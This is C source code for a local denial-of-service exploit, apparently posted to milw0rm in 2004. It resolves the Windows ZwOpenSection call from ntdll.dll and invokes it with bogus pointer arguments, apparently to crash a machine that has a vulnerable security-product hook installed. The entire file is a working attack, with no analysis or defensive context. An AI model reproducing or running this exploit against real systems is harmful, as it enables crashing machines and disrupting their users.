/* 
*   ipd-dos.c 
* 
*   Copyright (c) 2002-2004 By Next Generation Security S.L. 
*   All rights   reserved 
* 
*   Compiles with: cl ipd-dos.c 
* 
*   Madrid, August 2004 
*/ 

#include <windows.h> 

#define MY_NULL 0x01 
typedef DWORD (* zwopensection_TYPE)(DWORD Handle, DWORD mask, DWORD oa); 

int main(int argc, char *argv[]) { 
HINSTANCE dll; 
zwopensection_TYPE my_ZwOpenSection; 

  if ((dll=LoadLibrary("ntdll.dll"))!=NULL) { 

    if ((my_ZwOpenSection=(zwopensection_TYPE)GetProcAddress(dll,"ZwOpenSection"))!=NULL) { 

        my_ZwOpenSection(MY_NULL,MY_NULL,MY_NULL); 

    } 
  } 

} 

// milw0rm.com [2004-08-18]
